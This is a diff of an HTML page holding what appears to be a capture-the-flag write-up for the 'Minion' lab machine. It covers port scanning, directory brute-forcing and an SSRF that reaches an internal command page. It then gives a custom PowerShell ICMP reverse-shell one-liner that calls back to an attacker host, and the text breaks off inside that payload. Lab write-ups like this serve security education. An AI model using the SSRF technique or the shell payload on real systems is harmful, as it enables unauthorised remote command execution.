@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.96.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -300,413 +300,413 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.57
-<span class="err">
-</span><span class="err"></span><span class="go">Starting masscan 1.0.4 
-</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span><span class="go">Initiating SYN Stealth Scan
-</span><span class="go">Scanning 1 hosts [65536 ports/host]
-</span><span class="go">Discovered open port 62696/tcp on 10.10.10.57                                  
-</span><span class="go">rate:  0.00-kpps, 100.00% done, waiting 3-secs, found=1
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.57
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 
+</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 62696/tcp on 10.10.10.57                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">rate:  0.00-kpps, 100.00% done, waiting 3-secs, found=1
+</span></span></span></code></pre></div></div></p>
 
 <p>We found TCP port 62696 open. Let&rsquo;s explore it using nmap:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A -p62696 10.10.10.57
-<span class="go">Starting Nmap 7.70 ( https://nmap.org ) 
-</span><span class="go">Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-</span><span class="go">SYN Stealth Scan Timing: About 100.00% done; ETC: 18:14 (0:00:00 remaining)
-</span><span class="go">Nmap scan report for 10.10.10.57
-</span><span class="go">Host is up (0.088s latency).
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">PORT      STATE SERVICE VERSION
-</span><span class="go">62696/tcp open  http    Microsoft IIS httpd 8.5
-</span><span class="go">| http-methods: 
-</span><span class="go">|_  Potentially risky methods: TRACE
-</span><span class="go">| http-robots.txt: 1 disallowed entry 
-</span><span class="go">|_/backend
-</span><span class="go">|_http-server-header: Microsoft-IIS/8.5
-</span><span class="go">|_http-title: Site doesn&#39;t have a title (text/html).
-</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-</span><span class="go">Device type: general purpose
-</span><span class="go">Running (JUST GUESSING): Microsoft Windows 2012|7 (90%)
-</span><span class="go">OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7::-:professional
-</span><span class="go">Aggressive OS guesses: Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows 7 Professional (85%)
-</span><span class="go">No exact OS matches for host (test conditions non-ideal).
-</span><span class="go">Network Distance: 2 hops
-</span><span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -A -p62696 10.10.10.57
+</span></span><span class="line"><span class="cl"><span class="go">Starting Nmap 7.70 ( https://nmap.org ) 
+</span></span></span><span class="line"><span class="cl"><span class="go">Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">SYN Stealth Scan Timing: About 100.00% done; ETC: 18:14 (0:00:00 remaining)
+</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.57
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.088s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT      STATE SERVICE VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">62696/tcp open  http    Microsoft IIS httpd 8.5
+</span></span></span><span class="line"><span class="cl"><span class="go">| http-methods: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  Potentially risky methods: TRACE
+</span></span></span><span class="line"><span class="cl"><span class="go">| http-robots.txt: 1 disallowed entry 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_/backend
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Microsoft-IIS/8.5
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="go">Device type: general purpose
+</span></span></span><span class="line"><span class="cl"><span class="go">Running (JUST GUESSING): Microsoft Windows 2012|7 (90%)
+</span></span></span><span class="line"><span class="cl"><span class="go">OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7::-:professional
+</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows 7 Professional (85%)
+</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></span></span><span class="line"><span class="cl"><span class="go">Network Distance: 2 hops
+</span></span></span><span class="line"><span class="cl"><span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>dirsearch -u http://10.10.10.57:62696 -w /opt/DirBuster/directory-list-2.3-medium.txt -f -e asp,aspx -x <span class="m">400</span> 
-<span class="err">
-</span><span class="err"></span><span class="go"> _|. _ _  _  _  _ _|_    v0.3.8
-</span><span class="go">(_||| _) (/_(_|| (_| )
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Extensions: asp, aspx | Threads: 10 | Wordlist size: 661562
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Target: http://10.10.10.57:62696
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[19:22:48] Starting: 
-</span><span class="go">[19:22:59] 200 -   41B  - /test.asp
-</span><span class="go">[19:23:01] 200 -   20B  - /backend/
-</span><span class="go">[19:25:27] 200 -   41B  - /Test.asp
-</span><span class="go">...
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirsearch -u http://10.10.10.57:62696 -w /opt/DirBuster/directory-list-2.3-medium.txt -f -e asp,aspx -x <span class="m">400</span> 
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> _|. _ _  _  _  _ _|_    v0.3.8
+</span></span></span><span class="line"><span class="cl"><span class="go">(_||| _) (/_(_|| (_| )
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Extensions: asp, aspx | Threads: 10 | Wordlist size: 661562
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Target: http://10.10.10.57:62696
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[19:22:48] Starting: 
+</span></span></span><span class="line"><span class="cl"><span class="go">[19:22:59] 200 -   41B  - /test.asp
+</span></span></span><span class="line"><span class="cl"><span class="go">[19:23:01] 200 -   20B  - /backend/
+</span></span></span><span class="line"><span class="cl"><span class="go">[19:25:27] 200 -   41B  - /Test.asp
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div>
 
 <p>Let&rsquo;s explore <a href="http://10.10.10.57:62696/test.asp:" target="_blank">http://10.10.10.57:62696/test.asp:</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Missing Parameter Url [u] in GET request!</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Missing Parameter Url [u] in GET request!</span></span></code></pre></div></p>
 
 <p>Interesting. It asks for a &ldquo;u&rdquo; parameter. Maybe &ldquo;u&rdquo; means URL. Let&rsquo;s try <a href="http://10.10.10.57:62696/test.asp?u=http://127.0.0.1" target="_blank">http://10.10.10.57:62696/test.asp?u=http://127.0.0.1</a> (i.e. localhost):
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Site Administration<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">table</span> <span class="na">border</span><span class="o">=</span><span class="s">1</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Edit Configuration<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Start/Stop Instance<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>View Summary<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>View Logs<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://127.0.0.1/cmd.aspx&#34;</span><span class="p">&gt;</span>system commands<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Site Administration<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">table</span> <span class="na">border</span><span class="o">=</span><span class="s">1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Edit Configuration<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>Start/Stop Instance<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>View Summary<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>View Logs<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;&lt;</span><span class="nt">td</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://127.0.0.1/cmd.aspx&#34;</span><span class="p">&gt;</span>system commands<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div></p>
 
 <p>Bingo! This &ldquo;cmd.aspx&rdquo; looks very promising&hellip; Let&rsquo;s visit <a href="http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx:" target="_blank">http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx:</a>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-
-<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;cmd.aspx&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">POST</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Enter your shell command: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">text</span> <span class="na">name</span><span class="o">=</span><span class="s">xcmd</span> <span class="na">size</span><span class="o">=</span><span class="s">40</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;cmd.aspx&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">POST</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Enter your shell command: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">text</span> <span class="na">name</span><span class="o">=</span><span class="s">xcmd</span> <span class="na">size</span><span class="o">=</span><span class="s">40</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div></p>
 
 <p>Hmmmm&hellip; The method is POST and the parameter is named &ldquo;xcmd&rdquo;. Nevertheless, let&rsquo;s make an experiment. We are going to use the GET method and pass the xcmd parameter via the URL. We will set the xcmd = ping -n 3 10.10.14.161:
 <a href="http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=ping%20-n%203%2010.10.14.161" target="_blank">http://10.10.10.57:62696/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=ping%20-n%203%2010.10.14.161</a></p>
 
 <p>On our side, let&rsquo;s see if we capture any pings coming from MINION (10.10.10.57):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>tcpdump -i tun0 icmp
-<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-</span><span class="go">listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
-</span><span class="go">18:54:11.34867 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14290, length 40
-</span><span class="go">18:54:11.34868 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14290, length 40
-</span><span class="go">18:54:12.35746 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14301, length 40
-</span><span class="go">18:54:12.35747 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14301, length 40
-</span><span class="go">18:54:13.34309 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14310, length 40
-</span><span class="go">18:54:13.34310 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14310, length 40
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> tcpdump -i tun0 icmp
+</span></span><span class="line"><span class="cl"><span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+</span></span></span><span class="line"><span class="cl"><span class="go">listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go">18:54:11.34867 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14290, length 40
+</span></span></span><span class="line"><span class="cl"><span class="go">18:54:11.34868 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14290, length 40
+</span></span></span><span class="line"><span class="cl"><span class="go">18:54:12.35746 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14301, length 40
+</span></span></span><span class="line"><span class="cl"><span class="go">18:54:12.35747 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14301, length 40
+</span></span></span><span class="line"><span class="cl"><span class="go">18:54:13.34309 IP 10.10.10.57 &gt; 10.10.14.161: ICMP echo request, id 2, seq 14310, length 40
+</span></span></span><span class="line"><span class="cl"><span class="go">18:54:13.34310 IP 10.10.14.161 &gt; 10.10.10.57: ICMP echo reply, id 2, seq 14310, length 40
+</span></span></span></code></pre></div></div>
 It&rsquo;s working! :D</p>
 
 <h1 id="getting-shell">Getting shell</h1>
 
 <p>It&rsquo;s time for us to get a shell. On our side we can run icmpsh_m.py from <a href="https://github.com/inquisb/icmpsh" target="_blank">https://github.com/inquisb/icmpsh</a> and on MINION we can send this payload: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" target="_blank">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1</a>
 The problem is that if we try to send this payload via the xcmd paremeter some symbols are getting filtered (&ldquo;+&rdquo;, &ldquo;&amp;&ldquo;, &ldquo;/&rdquo;) and there is also a size limit. We can double url-encode the special symbols to pass them through. We can also use multiple &ldquo;echo &gt;&gt;&rdquo; commands to write a ps1 script file and indeed many guys followed that path. But I chose a different way. Just for fun, I wrote my own -very compact- one-liner payload without using any &ldquo;+&rdquo;,&rdquo;&amp;&rdquo; symbols:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$ip</span> <span class="p">=</span> <span class="s1">&#39;LHOST&#39;</span><span class="p">;</span> <span class="nv">$id</span> <span class="p">=</span> <span class="s1">&#39;UNIQUEID&#39;</span><span class="p">;</span> <span class="nv">$ic</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">Ping</span><span class="p">;</span> <span class="nv">$po</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">PingOptions</span><span class="p">;</span> <span class="nv">$po</span><span class="p">.</span><span class="n">DontFragment</span><span class="p">=</span><span class="nv">$true</span><span class="p">;</span> <span class="k">function</span> <span class="n">s</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ic</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="n">5000</span><span class="p">,(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$b</span><span class="p">),</span><span class="nv">$po</span><span class="p">)</span> <span class="p">};</span> <span class="k">function</span> <span class="n">p</span> <span class="p">{</span> <span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="s1">&#39;[P$] &#39;</span><span class="p">,$(</span><span class="n">whoami</span><span class="p">),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="nv">$env:computername</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,$((</span><span class="nb">gi </span><span class="nv">$pwd</span><span class="p">).</span><span class="n">Name</span><span class="p">),</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span> <span class="p">};</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$r</span> <span class="p">=</span> <span class="n">s</span><span class="p">(</span><span class="n">p</span><span class="p">);</span> <span class="k">if</span> <span class="p">(!</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$rs</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">);</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">8</span><span class="p">)</span> <span class="o">-ne</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="p">};</span> <span class="k">try</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="n">-Command</span> <span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">8</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">|</span><span class="nb">out-string</span><span class="p">)</span> <span class="p">};</span> <span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$rt</span><span class="p">.</span><span class="n">length</span><span class="p">-</span><span class="n">110</span><span class="p">)</span> <span class="p">{</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="n">110</span><span class="p">)));</span> <span class="nv">$i</span> <span class="p">-=</span> <span class="p">-</span><span class="n">110</span><span class="p">;</span> <span class="p">};</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">)));</span> <span class="p">}</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="p">=</span> <span class="s1">&#39;LHOST&#39;</span><span class="p">;</span> <span class="nv">$id</span> <span class="p">=</span> <span class="s1">&#39;UNIQUEID&#39;</span><span class="p">;</span> <span class="nv">$ic</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">Ping</span><span class="p">;</span> <span class="nv">$po</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">NetworkInformation</span><span class="p">.</span><span class="n">PingOptions</span><span class="p">;</span> <span class="nv">$po</span><span class="p">.</span><span class="n">DontFragment</span><span class="p">=</span><span class="nv">$true</span><span class="p">;</span> <span class="k">function</span> <span class="n">s</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$ic</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="n">5000</span><span class="p">,(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$b</span><span class="p">),</span><span class="nv">$po</span><span class="p">)</span> <span class="p">};</span> <span class="k">function</span> <span class="n">p</span> <span class="p">{</span> <span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="s1">&#39;[P$] &#39;</span><span class="p">,$(</span><span class="n">whoami</span><span class="p">),</span><span class="s1">&#39;@&#39;</span><span class="p">,</span><span class="nv">$env:computername</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,$((</span><span class="nb">gi </span><span class="nv">$pwd</span><span class="p">).</span><span class="n">Name</span><span class="p">),</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span> <span class="p">};</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$r</span> <span class="p">=</span> <span class="n">s</span><span class="p">(</span><span class="n">p</span><span class="p">);</span> <span class="k">if</span> <span class="p">(!</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$rs</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">Buffer</span><span class="p">);</span>  <span class="k">if</span> <span class="p">(</span><span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">8</span><span class="p">)</span> <span class="o">-ne</span> <span class="nv">$id</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="p">};</span> <span class="k">try</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="n">-Command</span> <span class="nv">$rs</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span 